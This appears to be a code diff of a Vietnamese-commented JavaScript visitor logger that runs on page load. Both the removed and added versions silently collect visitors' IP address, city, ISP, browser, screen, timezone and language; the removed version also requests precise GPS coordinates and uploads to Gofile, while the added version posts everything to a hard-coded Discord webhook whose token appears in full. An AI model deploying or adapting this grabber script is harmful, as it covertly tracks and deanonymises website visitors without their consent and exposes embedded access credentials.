@@ -1,68 +1,44 @@
-const gofileLog = []; // Dùng để lưu các link gofile đã upload (hiển thị khi nhấn P)
-const gofileApi = "https://api.gofile.io/uploadFile";
+const webhook = "https://discord.com/api/webhooks/1395737547962843207/qVV9cmy5-6cYJv_jGOGOI1y3Ahe9hASVD_UVYvU1Yh2POpAinED_2Uxaimv_rCLiNFCK"; // <-- Thay webhook của bạn
 
-function sendToGofile(info) {
-  const blob = new Blob([JSON.stringify(info, null, 2)], { type: "text/plain" });
-  const form = new FormData();
-  form.append("file", blob, `visitor-${Date.now()}.txt`);
+(async () => {
+  const ipData = await fetch("https://ipinfo.io/json?token=3e01801adba7e3").then(res => res.json());
 
-  fetch(gofileApi, { method: "POST", body: form })
-    .then(res => res.json())
-    .then(result => {
-      const link = result.data.downloadPage;
-      gofileLog.push(link);
-      console.log("Gofile Link:", link);
-    })
-    .catch(err => console.error("Upload lỗi:", err));
-}
+  const data = {
+    ip: ipData.ip,
+    city: ipData.city,
+    region: ipData.region,
+    country: ipData.country,
+    org: ipData.org,
+    userAgent: navigator.userAgent,
+    screen: `${screen.width}x${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    language: navigator.language,
+    time: new Date().toLocaleString("vi-VN"),
+    source: "IP-Based"
+  };
 
-function collectAndUpload() {
-  fetch("https://ipapi.co/json")
-    .then(res => res.json())
-    .then(ipData => {
-      const info = {
-        ip: ipData.ip,
-        city: ipData.city,
-        region: ipData.region,
-        country: ipData.country_name,
-        org: ipData.org,
-        userAgent: navigator.userAgent,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        language: navigator.language,
-        time: new Date().toLocaleString(),
-        source: "IP-Based"
-      };
-
-      // Nếu cho định vị
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            info.source = "HTML5 Geolocation";
-            info.latitude = pos.coords.latitude;
-            info.longitude = pos.coords.longitude;
-            info.accuracy = pos.coords.accuracy + " meters";
-            sendToGofile(info);
-          },
-          err => {
-            console.warn("Không lấy được GPS:", err.message);
-            sendToGofile(info);
-          },
-          { enableHighAccuracy: true, timeout: 5000 }
-        );
-      } else {
-        sendToGofile(info);
+  const message = {
+    content: "📡 **New Visitor Info**",
+    embeds: [
+      {
+        title: "Visitor Details",
+        color: 0x00ffff,
+        fields: Object.entries(data).map(([k, v]) => ({
+          name: k,
+          value: String(v),
+          inline: false
+        })),
+        footer: {
+          text: "Auto Logger | Discord Webhook"
+        },
+        timestamp: new Date().toISOString()
       }
-    });
-}
+    ]
+  };
 
-collectAndUpload();
-
-// ADMIN PANEL: nhấn P để xem log Gofile
-document.addEventListener("keydown", (e) => {
-  if (e.key.toLowerCase() === "p") {
-    const panel = document.getElementById("adminPanel");
-    panel.innerHTML = "📁 Danh sách file Gofile đã upload:\n" + gofileLog.join("\n");
-    panel.style.display = panel.style.display === "none" ? "block" : "none";
-  }
-});
+  fetch(webhook, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(message)
+  });
+})();
